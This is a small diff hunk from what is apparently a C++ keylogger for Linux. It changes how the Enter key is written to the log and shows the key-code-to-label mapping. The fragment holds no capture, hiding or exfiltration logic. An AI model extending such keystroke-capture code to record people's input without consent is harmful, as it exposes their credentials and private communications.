@@ -126,7 +126,7 @@ void Keylogger::LinuxLoop() {
                 }
                else {
                     switch (ev.code) {
-                        case KEY_ENTER:     key = "[RETURN]\n"; break;
+                        case KEY_ENTER:     key = "[RETURN]"; break;
                         case KEY_BACKSPACE: key = "[DELETE]"; break;
                         case KEY_SPACE:     key = " "; break;
                         case KEY_TAB:       key = "[TAB]"; break;
